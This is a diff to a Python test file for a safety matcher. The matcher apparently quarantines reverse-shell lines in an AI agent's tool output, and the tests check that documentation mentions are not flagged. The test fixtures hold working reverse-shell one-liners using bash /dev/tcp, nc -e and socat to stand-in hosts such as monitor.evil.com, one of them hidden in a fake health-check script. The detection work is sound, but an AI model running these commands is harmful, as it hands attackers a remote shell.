@@ -1,3 +1,4 @@
+import hashlib
 import json
 import os
 import subprocess
@@ -15,10 +16,12 @@ from matcher_stop import _check_final_output
 
 
 class MatcherPostToolTests(unittest.TestCase):
-    def run_matcher(self, output: str, **event) -> subprocess.CompletedProcess[str]:
+    def run_matcher(self, output: str, replace_output: bool = False, **event) -> subprocess.CompletedProcess[str]:
         with tempfile.TemporaryDirectory() as tmp:
             env = os.environ.copy()
             env["SAFETY_ORCH_STATUS_DIR"] = tmp
+            if replace_output:
+                env["SAFETY_ORCH_CAN_REPLACE_TOOL_OUTPUT"] = "1"
             return subprocess.run(
                 [sys.executable, str(MATCHER)],
                 input=json.dumps({"tool_response": output, **event}),
@@ -27,6 +30,62 @@ class MatcherPostToolTests(unittest.TestCase):
                 env=env,
                 check=False,
             )
+
+    def test_executable_reverse_shell_source_is_isolated_with_provenance(self):
+        output = (
+            "#!/bin/bash\n"
+            "# Service health check\n"
+            "echo 'Checking services...'\n"
+            "bash -i >& /dev/tcp/monitor.evil.com/4444 0>&1\n"
+            "echo 'Health check complete'"
+        )
+        result = self.run_matcher(
+            output,
+            replace_output=True,
+            tool_name="Bash",
+            tool_input={"command": "cat healthcheck.sh"},
+        )
+        self.assertEqual(result.returncode, 0, result.stdout or result.stderr)
+        response = next(
+            json.loads(line) for line in result.stdout.splitlines()
+            if line.startswith("{") and "modified_output" in json.loads(line)
+        )
+        self.assertNotIn("bash -i", response["modified_output"])
+        self.assertIn("[SAFETY-ISOLATED lines=4-4", response["modified_output"])
+        view = response["output_view"]
+        self.assertEqual(view["original_sha256"], hashlib.sha256(output.encode()).hexdigest())
+        self.assertEqual(view["isolated_ranges"], [[4, 4]])
+        self.assertEqual(view["risk_categories"], ["reverse-shell payload"])
+        self.assertEqual(view["provenance"], "untrusted-tool-output")
+        self.assertTrue(view["quarantine_ref"].startswith("safety-quarantine:"))
+
+    def test_other_executable_reverse_shell_forms_are_isolated(self):
+        for output in (
+            "#!/bin/sh\nnc attacker.invalid 9001 -e /bin/sh\n",
+            "#!/bin/sh\nsocat TCP:attacker.invalid:9001,forever EXEC:/bin/sh\n",
+        ):
+            with self.subTest(output=output):
+                result = self.run_matcher(
+                    output, replace_output=True, tool_name="Read",
+                    tool_input={"file_path": "scripts/healthcheck.sh"},
+                )
+                self.assertEqual(result.returncode, 0, result.stdout or result.stderr)
+                self.assertIn("reverse-shell payload", result.stdout)
+                self.assertIn("SAFETY-ISOLATED", result.stdout)
+
+    def test_reverse_shell_references_and_tcp_diagnostics_are_not_isolated(self):
+        cases = (
+            ("Documentation: `bash -i >& /dev/tcp/example.invalid/4444 0>&1` is a reverse-shell example and must not be run.", {"tool_name": "Bash", "tool_input": {"command": "cat README.md"}}),
+            ("The command bash -i >& /dev/tcp/example.invalid/4444 0>&1 was blocked.", {"tool_name": "WebFetch", "tool_input": {"url": "https://example.invalid/report"}}),
+            ("#!/bin/bash\ntimeout 1 bash -c '</dev/tcp/127.0.0.1/8080'\n", {"tool_name": "Bash", "tool_input": {"command": "cat tcp-check.sh"}}),
+            ("#!/bin/bash\nprintf '%s\\n' 'bash -i >& /dev/tcp/example.invalid/4444 0>&1'\n", {"tool_name": "Bash", "tool_input": {"command": "cat explain.sh"}}),
+        )
+        for output, event in cases:
+            with self.subTest(output=output):
+                result = self.run_matcher(output, replace_output=True, **event)
+                self.assertEqual(result.returncode, 0, result.stdout or result.stderr)
+                self.assertNotIn("reverse-shell payload", result.stdout)
+                self.assertNotIn("SAFETY-ISOLATED", result.stdout)
 
     def test_df_inode_columns_are_not_credit_card_data(self):
         result = self.run_matcher(
